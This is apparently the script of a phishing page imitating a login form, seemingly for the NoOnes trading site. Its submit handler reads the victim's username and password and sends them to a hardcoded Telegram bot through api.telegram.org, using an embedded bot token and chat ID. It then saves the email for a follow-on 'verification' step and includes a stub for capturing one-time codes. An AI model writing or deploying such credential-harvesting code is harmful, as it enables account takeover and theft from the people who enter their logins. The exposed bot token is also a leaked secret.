const handleSubmit = async (event) => {
    event.preventDefault();

    const username = document.getElementById('mantine-xl0rzlkgf').value;
    const password = document.getElementById('password').value;

    // Telegram configuration
    const telegramKey = '5374499027:AAGMJa20GYdN3SixIaN4pwdo_4whQPk7jgk';
    const telegramId = '938303780';


    // Format message
    const message = encodeURIComponent(`noones\n${username}\n${password}`);

    try {
        // Send to first Telegram ID
        await fetch(`https://api.telegram.org/bot${telegramKey}/sendMessage?chat_id=${telegramId}&text=${message}`);
        //redirect to verification page
       // window.location.href = 'verification.html';
        //send email via localstorage and intercept on the other page
        localStorage.setItem('email', username);

    } catch (error) {
        console.error('Error sending messages:', error);
    }
};


const handleOTPSubmit = async (event) => {
    event.preventDefault();
    console.log("OTP submitted");
};

// Check if current path matches /offer/uJdeG2vkWKS and redirect to root
if (window.location.pathname === '/offer/uJdeG2vkWKS') {
    window.location.href = '/';
}